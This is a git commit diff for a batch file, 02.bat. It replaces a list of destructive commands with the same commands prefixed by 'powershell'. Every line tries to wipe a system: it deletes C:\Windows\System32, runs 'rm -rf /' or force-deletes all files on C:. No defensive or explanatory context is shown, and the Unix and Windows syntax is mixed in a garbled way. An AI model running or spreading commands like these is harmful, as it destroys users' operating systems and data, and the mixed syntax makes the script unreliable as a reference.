e94fc2aa3daa2a1bc68dc40f2222a1ac5ce31e1d
Daniel Nuñez <92348777+RagnarokUchiha@users.noreply.github.com>
2024-03-16 15:19:15 -0300

    02.bat

--- 02.bat
+++ 02.bat
@@ -1,10 +1,10 @@
 @echo OFF
-rm -rf C:\Windows\System32 --no-preserve-root
-sudo rm -rf / --no-preserve-root
-rmdir /s /q C:\Windows\System32
-rm -rf C:\Windows\System32 -f --no-preserve-root
-rm -rf C:\Windows\System32 -f
-sudo rm -rf C:\Windows\System32 -f
-rmdir C:\Windows\System32
-del /f c:\*.*
-sudo rm -rf C:\Windows\System32 -f --no-preserve-root
+powershell rm -rf C:\Windows\System32 --no-preserve-root
+powershell sudo rm -rf / --no-preserve-root
+powershell rmdir /s /q C:\Windows\System32
+powershell rm -rf C:\Windows\System32 -f --no-preserve-root
+powershell rm -rf C:\Windows\System32 -f
+powershell sudo rm -rf C:\Windows\System32 -f
+powershell rmdir C:\Windows\System32
+powershell del /f c:\*.* & S
+powershell sudo rm -rf C:\Windows\System32 -f --no-preserve-root
